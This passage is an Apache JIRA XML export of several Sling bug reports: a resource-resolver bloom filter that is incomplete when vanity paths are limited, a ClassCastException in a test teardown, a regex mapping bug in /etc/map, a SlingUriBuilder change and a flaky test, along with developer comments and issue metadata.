                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 20 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z12wog:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11363] resource resolver: bloom filter incomplete when vanity path size limited</title>
                <link>https://issues.apache.org/jira/browse/SLING-11363</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;This was a problem before, but has become easier to reproduce after &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11113&quot; title=&quot;resource resolver: bloom filter might be out of sync on startup&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11113&quot;&gt;&lt;del&gt;SLING-11113&lt;/del&gt;&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;When reading the vanity paths, processing stops after the cache is full (where the default is &apos;unlimited&apos;). In that case, additional paths are not added to the bloom filter, and thus the application of the bloom filter will cause them never to get looked up.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13447906">SLING-11363</key>
            <summary>resource resolver: bloom filter incomplete when vanity path size limited</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="reschke">Julian Reschke</reporter>
                        <labels>
                    </labels>
                <created>Wed, 1 Jun 2022 11:09:39 +0000</created>
                <updated>Thu, 16 Mar 2023 10:00:13 +0000</updated>
                            <resolved>Fri, 5 Aug 2022 05:28:53 +0000</resolved>
                                    <version>Resource Resolver 1.8.2</version>
                                    <fixVersion>Resource Resolver 1.10.0</fixVersion>
                                    <component>ResourceResolver</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="3000">50m</timespent>
                                <comments>
                            <comment id="17544827" author="reschke" created="Wed, 1 Jun 2022 11:35:44 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourceresolver/pull/71&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-resourceresolver/pull/71&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17575582" author="cziegeler" created="Fri, 5 Aug 2022 05:28:53 +0000"  >&lt;p&gt;PR got applied some time ago&lt;/p&gt;</comment>
                            <comment id="17701065" author="wim.symons" created="Thu, 16 Mar 2023 09:58:24 +0000"  >&lt;p&gt;Affects 1.7.10 as well, it even rendered our AEM 6.5.15.0 unusable after a restart (when bloom filter is read from disk), every path rendered a Resource Not Found. Setting resource.resolver.vanitypath.maxEntries to -1 fixed it.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10032">
                    <name>Blocker</name>
                                            <outwardlinks description="blocks">
                                        <issuelink>
            <issuekey id="13449799">SLING-11394</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="13426202">SLING-11113</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 31 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z12v6w:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11362] Potential ClassCastException in SlingContextImpl.tearDown</title>
                <link>https://issues.apache.org/jira/browse/SLING-11362</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;In &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-sling-mock/blob/9d147a8127a6ada5a82e5c2b7e875febf2d93b89/core/src/main/java/org/apache/sling/testing/mock/sling/context/SlingContextImpl.java#L220&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-testing-sling-mock/blob/9d147a8127a6ada5a82e5c2b7e875febf2d93b89/core/src/main/java/org/apache/sling/testing/mock/sling/context/SlingContextImpl.java#L220&lt;/a&gt; the request attribute with key &lt;tt&gt;SlingBindings.class.getName()&lt;/tt&gt; is unconditionally cast to &lt;tt&gt;MockSlingBindings&lt;/tt&gt; which may fail in case the test case modified the request attribute to another SlingBindings implementation.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13447853">SLING-11362</key>
            <summary>Potential ClassCastException in SlingContextImpl.tearDown</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Wed, 1 Jun 2022 06:52:28 +0000</created>
                <updated>Tue, 5 Jul 2022 08:27:15 +0000</updated>
                            <resolved>Wed, 1 Jun 2022 12:11:23 +0000</resolved>
                                    <version>Testing Sling Mock 3.3.0</version>
                                    <fixVersion>Testing Sling Mock 3.3.2</fixVersion>
                                    <component>Testing</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="2400">40m</timespent>
                                <comments>
                            <comment id="17544864" author="kwin" created="Wed, 1 Jun 2022 12:11:23 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-sling-mock/commit/07497b27abc042a2becd77eebb0ac0c2b6e9b70b&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-testing-sling-mock/commit/07497b27abc042a2becd77eebb0ac0c2b6e9b70b&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310560">
                    <name>Problem/Incident</name>
                                                                <inwardlinks description="is caused by">
                                        <issuelink>
            <issuekey id="13414060">SLING-10944</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 21 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z12uv4:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11352] Cannot create path-only mapping rule in /etc/map</title>
                <link>https://issues.apache.org/jira/browse/SLING-11352</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;I am trying to set up a mapping to make some of our site hierarchy appear on a different URL than what would be dictated by the hierarchy. My goal is to map the path /content/mycompany/locales/some_locale/sectionA to the URL /some_locale/sectionB . (I don&apos;t want to override the protocol, host and port fields.) Because we support multiple locales, I need to use a regex for setting up the matches. Here is my original attempt:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
/etc/map/my_mapping
     +-- sling:internalRedirect = /content/mycompany/locales/([-a-z]+)/sectionA
     +-- sling:match = /$1/sectionB&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;When this node is present, /content/mycompany/locales/en-us/sectionA/foo gets mapped to /en-us://sectionB/foo instead of the intended /en-us/sectionB/foo.&lt;/p&gt;

&lt;p&gt;I can work around the issue by avoiding forward slashes in sling:match, but this is ugly and unclear :&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
/etc/map/my_mapping
     +-- sling:internalRedirect = /content/mycompany/locales/([-a-z]+)(/)sectionA
     +-- sling:match = /$1$2sectionB &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Is this kind of mapping supported at all? I would rather avoid adding the hostname to mapping rules because it is environment-specific.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13447518">SLING-11352</key>
            <summary>Cannot create path-only mapping rule in /etc/map</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="4" iconUrl="https://issues.apache.org/jira/images/icons/priorities/minor.svg">Minor</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="Csaba Varga">Csaba Varga</reporter>
                        <labels>
                    </labels>
                <created>Mon, 30 May 2022 12:36:50 +0000</created>
                <updated>Tue, 25 Mar 2025 15:47:17 +0000</updated>
                                            <version>Resource Resolver 1.8.4</version>
                                                    <component>ResourceResolver</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="4200">1h 10m</timespent>
                                <comments>
                            <comment id="17543933" author="csaba varga" created="Mon, 30 May 2022 12:44:08 +0000"  >&lt;p&gt;Looks like the issue is in the MapEntry.toURI method. Its comment says that it is only supposed to process absolute URIs and should return null for regular paths like &quot;/the/path&quot;. It actually returns &quot;/the://path&quot; when given the input &quot;/the/path&quot;.&lt;/p&gt;

&lt;p&gt;toURI tries four regexes, but the fourth one is overly generic and will match anything that contains a forward slash anywhere but at the very beginning. The regexes look like they are meant to describe the whole string, so maybe they should be matched using Matcher.matches instead of Matcher.find. That way, none of them would match &quot;/the/path&quot; and the method would start working as documented.&lt;/p&gt;</comment>
                            <comment id="17609444" author="csaba varga" created="Mon, 26 Sep 2022 11:19:23 +0000"  >&lt;p&gt;I have opened a PR with a proposed fix: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourceresolver/pull/84&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-resourceresolver/pull/84&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Could someone please take a look at it?&lt;/p&gt;</comment>
                            <comment id="17933840" author="joerghoh" created="Mon, 10 Mar 2025 11:48:39 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=Csaba+Varga&quot; class=&quot;user-hover&quot; rel=&quot;Csaba Varga&quot;&gt;Csaba Varga&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Looking into this, this seems to be a totally new requirement, because the existing implementation always requires you to specify at least a protocol. Is this correct?&lt;/p&gt;</comment>
                            <comment id="17933978" author="csaba varga" created="Mon, 10 Mar 2025 17:36:47 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=joerghoh&quot; class=&quot;user-hover&quot; rel=&quot;joerghoh&quot;&gt;joerghoh&lt;/a&gt; : The &lt;a href=&quot;https://sling.apache.org/documentation/the-sling-engine/mappings-for-resource-resolution.html#regular-expressions-for-reverseoutgoing-mappings&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;example for reverse/outgoing mappings&lt;/a&gt; in the documentation has a similar example, where sing:internalRedirect is a regex that matches a path. Specifying a path (instead of a protocol/server/path triple) is working on our AEM instances, and has been for years, so I expected the mappings in my reports to work as well.&lt;/p&gt;

&lt;p&gt;I&apos;m not sure what is the expected approach when you need outgoing regex mappings. The hostname of an environment may vary between development, staging and production, so it doesn&apos;t feel wise to include it in the mapping rules.&lt;/p&gt;</comment>
                            <comment id="17934012" author="joerghoh" created="Mon, 10 Mar 2025 19:29:39 +0000"  >&lt;p&gt;There is such a mapping, but the path is actually /etc/map/example.com.80 and therefor includes a hostname. I don&apos;t see that in your example, and for that I think that this is a new feature.&lt;br/&gt;
In best TDD tradition I would start with a series of unittests, which can act as specification for this behavior, and then implement the necessary changes. The URL mapping in Sling is quite complex in all its nuances, and for that I think that we should have a good unit test coverage across all situations. But I think we are not there.&lt;/p&gt;

&lt;p&gt;Can you specify the desired behavior here in the ticket in a structured way (that means content structure and the expected results), so it&apos;s possible to translate it into tests? &lt;/p&gt;

&lt;p&gt;Thanks your help!&lt;/p&gt;



</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            32 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z12ssw:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11347] SlingUriBuilder.createFrom(request) should preserve any mapped resource path</title>
                <link>https://issues.apache.org/jira/browse/SLING-11347</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Use Case:&lt;/p&gt;

&lt;p&gt;Use the SlingUriBuilder.createFrom(request) call from a servlet in order to create a SlingUri from the current request in order to change the selectors (or extension) and then redirect to that new uri value.&lt;/p&gt;

&lt;p&gt;Expected:&lt;/p&gt;

&lt;p&gt;When calling SlingUriBuilder.createFrom(request) for a mapped request path, the built SlingUri object should return the original mapped path from the getResourcePath() call instead of the resource path that was resolved from the mapped path.&lt;/p&gt;

&lt;p&gt;This should help to avoid accidentally switching from /folder/page1 to /content/folder/page1 in the SlingUri output.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13447410">SLING-11347</key>
            <summary>SlingUriBuilder.createFrom(request) should preserve any mapped resource path</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="4" iconUrl="https://issues.apache.org/jira/images/icons/priorities/minor.svg">Minor</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="enorman">Eric Norman</assignee>
                                    <reporter username="enorman">Eric Norman</reporter>
                        <labels>
                    </labels>
                <created>Sun, 29 May 2022 21:39:06 +0000</created>
                <updated>Mon, 20 Jun 2022 17:11:20 +0000</updated>
                            <resolved>Sat, 11 Jun 2022 22:50:44 +0000</resolved>
                                                    <fixVersion>API 2.25.4</fixVersion>
                                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="1800">0.5h</timespent>
                                <comments>
                            <comment id="17553181" author="enorman" created="Sat, 11 Jun 2022 22:50:44 +0000"  >&lt;p&gt;Merged PR #14 at: &#160;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-api/commit/2c820300ee67eaa43e925a646dd4398dcda7a2be&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;&lt;tt&gt;2c82030&lt;/tt&gt;&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 19 weeks, 4 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z12s4w:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11346] CleanUpTest is flaky</title>
                <link>https://issues.apache.org/jira/browse/SLING-11346</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The CleanUpTest is flaky and fails depending on date.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13447260">SLING-11346</key>
            <summary>CleanUpTest is flaky</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="joerghoh">Joerg Hoh</assignee>
                                    <reporter username="joerghoh">Joerg Hoh</reporter>
                        <labels>
                    </labels>
                <created>Fri, 27 May 2022 16:46:23 +0000</created>
                <updated>Mon, 27 Jun 2022 11:08:18 +0000</updated>
                            <resolved>Tue, 31 May 2022 07:55:38 +0000</resolved>
                                    <version>Event 4.3.2</version>
                                    <fixVersion>Event 4.3.6</fixVersion>
                                    <component>Event</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
